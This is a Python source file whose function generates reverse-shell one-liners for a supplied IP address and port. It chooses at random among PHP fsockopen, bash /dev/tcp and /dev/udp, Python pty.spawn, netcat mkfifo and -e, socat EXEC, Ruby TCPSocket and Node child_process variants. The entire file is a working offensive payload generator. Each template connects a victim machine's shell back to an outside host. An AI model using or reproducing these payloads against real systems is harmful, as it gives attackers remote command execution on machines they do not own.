import random as rand
from icecream import ic


def generate_revshell(ip_addr: str, port: int, *args: (None, str)) -> str:
    try:
        php_shells = [f'''php -r '$sock=fsockopen("{ip_addr}",{port});exec("/bin/bash <&3 >&3 2>&3");\'''',
                      f'''php -r '$sock=fsockopen("{ip_addr}",{port});passthru("/bin/bash <&3 >&3 2>&3");\'''']
        bash_shells = [f'''/bin/bash -i >& /dev/tcp/{ip_addr}/{port} 0>&1''',
                       f'''exec 5<>/dev/tcp/{ip_addr}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done''',
                       f'''/bin/bash -i >& /dev/udp/{ip_addr}/{port} 0>&1''']
        python_shells = [f'''export RHOST="{ip_addr}";export RPORT={port};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")\'''',
                         f'''python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{ip_addr}",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")\'''']
        nc_shells = [f'''rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {ip_addr} {port} >/tmp/f''',
                     f'''nc {ip_addr} {port} -e /bin/bash''',
                     f'''nc -c /bin/bash {ip_addr} {port}''']
        socat_shells = [f'''socat TCP:{ip_addr}:{port} EXEC:/bin/bash''',
                        f'''socat TCP:{ip_addr}:{port} EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane''']
        ruby_shells = [f'''ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("{ip_addr}",{port}))\'''']
        node_shells = [f'''require('child_process').exec('nc -e /bin/bash {ip_addr} {port}')''']

        if args[0] is not None:
            ic(args[0])
            match args[0]:
                case "php":
                    rev_shell = rand.choice(php_shells)
                    return rev_shell
                case "bash":
                    rev_shell = rand.choice(bash_shells)
                    return rev_shell
                case "python":
                    rev_shell = rand.choice(python_shells)
                    return rev_shell
                case "nc":
                    rev_shell = rand.choice(nc_shells)
                    return rev_shell
                case "socat":
                    rev_shell = rand.choice(socat_shells)
                    return rev_shell
                case "ruby":
                    rev_shell = rand.choice(ruby_shells)
                    return rev_shell
                case "node":
                    rev_shell = rand.choice(node_shells)
                    return rev_shell

        return rand.choice(php_shells + bash_shells + python_shells)
    except Exception as e:
        ic(e)
